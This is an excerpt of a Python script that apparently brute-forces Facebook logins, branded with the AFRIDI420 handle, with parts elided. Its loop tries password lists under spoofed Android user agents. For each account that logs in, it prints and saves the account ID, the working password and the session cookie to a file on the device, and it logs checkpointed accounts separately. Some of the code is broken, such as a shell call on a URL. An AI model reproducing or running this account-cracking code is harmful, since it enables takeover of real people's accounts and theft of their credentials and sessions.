...
def ud():
    ...
    opt = input('\n   Choose option >>> ')
    if opt == '1':
        os.system('https://free.facebook.com/profile.php?id=100085701982549')
        FD()
        return None
...
\033[1;32m     \033[1;33mCREATED BY\33[0;m   :  \033[1;33mAFRIDI420\33[0;m\033[1;32m && \033[1;33mKASHIF\33[0;m
\033[1;32m     \033[1;32mFACEBOK      : \033[1;34m AFRIDI420 KhAn
...
\033[1;37m================= \33[32;45mAFRIDI420\33[0;m =====================
...
for xd in range(1000000):
    aa='Mozilla/5.1 (Linux; U; Android'
    ...
    try:
        for ps in pwx:
            ...
            if 'c_user' in log_cookies:
                ...
                cid = coki[7:22]
                print('    \033[1;32m(AFRIDI420-OKðŸ”¥)  ' +cid+ ' | ' +ps+    '  \n \033[1;33mCookie = \033[1;32m'+coki+  ' \n '+pro+'  \033[0;97m')
                cek_apk(session,coki)
                open('/sdcard/AFRIDI420-OK.txt', 'a').write( cid+' | '+ps+'\n')
                oks.append(cid)
                break
            elif 'checkpoint' in log_cookies:
                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                cid = coki[24:39]
                print('    \33[1;30m(AFRIDI420-CPðŸ¤•)  ' +cid+ ' | ' +ps+           '  \33[0;97m')
                open('/sdcard/AFRIDI420-CP.txt', 'a').write( cid+' | '+ps+' \n')
                cps.append(cid)
                break
            else:
                continue
        loop+=1
        sys.stdout.write('\r     %s[AFRIDI420] [%s/%s]  OK:- %s  CP:- %s \r'%(H,loop,tl,len(oks),len(cps))),
        sys.stdout.flush()
    except:
        pass
